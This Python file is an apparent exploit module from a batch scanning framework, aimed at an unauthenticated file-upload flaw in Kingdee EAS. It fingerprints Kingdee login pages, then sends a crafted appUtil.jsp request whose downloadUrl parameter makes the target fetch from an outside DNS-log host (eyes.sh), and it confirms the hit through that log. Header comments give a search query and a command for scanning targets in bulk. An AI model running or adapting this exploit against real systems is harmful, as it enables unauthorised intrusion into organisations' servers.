# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 13:19

from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from core.utils.dnslog import eyes_dnslog_verify
from exploit.scripts import BaseScript


# "kingdee" && country="CN"
# python3 batch.py -m exploit.scripts.OA.Kingdee.unauth_uploadfile -cs -fs "app=\"Kingdee-EAS\""

class Script(BaseScript):
    name = 'Kingdee'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://cvepush.com/2022/07/26/%e9%87%91%e8%9d%b6-eas%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0-2/'
        # 特定路径判断
        self.detect_path_list = ['/easportal']
        # exec
        self.exec_path_list = [r'/easportal/tools/appUtil.jsp?EAS_HOME=C:\Kingdee\eas\&type=Rabb&downloadUrl=http://{}.9999.eyes.sh']
        # priority
        self.priority = 1
        # 相关信息
        self.info = 'kangdee eas uploadfile'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if ('Kingdee.EntryRole' in text and 'loginKDLogo' in text) or '金蝶国际软件集团有限公司版权所有' in text or '''var formidafterlogin = '"bos_mainconsolesutra"''' in text or 'class="kd-div-loading-ct"' in text or 'logo-kingdee.png' in text or 'eassessionid' in text or '/eassso/common' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                verify_random_int = random.randint(10000, 99999)
                exec_path = exec_path.format(verify_random_int)
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} {} Verify:{}] {}'.format(self.name, self.bug_type, verify_random_int, url))
                    return {'name': 'Kingdee Uploadfile - Verify param %s' % verify_random_int, 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass